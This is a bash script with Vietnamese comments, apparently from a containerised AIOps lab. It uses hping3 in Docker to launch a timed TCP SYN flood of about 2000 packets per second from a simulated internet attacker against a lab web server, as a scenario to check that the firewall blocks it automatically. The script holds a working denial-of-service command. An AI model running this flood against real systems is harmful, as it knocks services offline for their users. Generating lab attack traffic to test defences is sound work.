#!/usr/bin/env bash
# =============================================================================
# Kịch bản 03: Tấn công DoS SYN Flood từ Internet (North - South Attack)
# Mục đích: Bắn bão gói TCP SYN vào port 80 của Web Server qua Firewall
# Nguồn: internet-attacker (203.0.113.10)
# Đích: service-server (192.168.10.10:80)
# Điểm chặn tự động: Firewall (iptables drop nguồn 203.0.113.10)
# Công cụ: hping3
# =============================================================================
set -euo pipefail

DURATION="${1:-60}"
P="clab-aiops-prod"

echo "[$(date '+%Y-%m-%d %H:%M:%S')] [START] Kịch bản 03: Internet SYN Flood (Thời lượng: ${DURATION}s)..."

cleanup() {
  echo
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] [CLEANUP] Dừng hping3 trên internet-attacker..."
  docker exec "$P-internet-attacker" killall hping3 2>/dev/null || true
}
trap cleanup INT TERM EXIT

echo "  [+] Bắn TCP SYN Flood tốc độ cao (~2000 pkts/s) vào 192.168.10.10:80..."
# -i u500: gửi 1 gói mỗi 500 microseconds = 2000 packets/s
docker exec "$P-internet-attacker" sh -c \
  "nohup hping3 -S -p 80 -i u500 192.168.10.10 >/dev/null 2>&1 &"

ELAPSED=0
while [ "$ELAPSED" -lt "$DURATION" ]; do
  sleep 2
  ELAPSED=$((ELAPSED + 2))
done

cleanup

echo "[$(date '+%Y-%m-%d %H:%M:%S')] [END] Kịch bản 03: Internet SYN Flood hoàn thành."
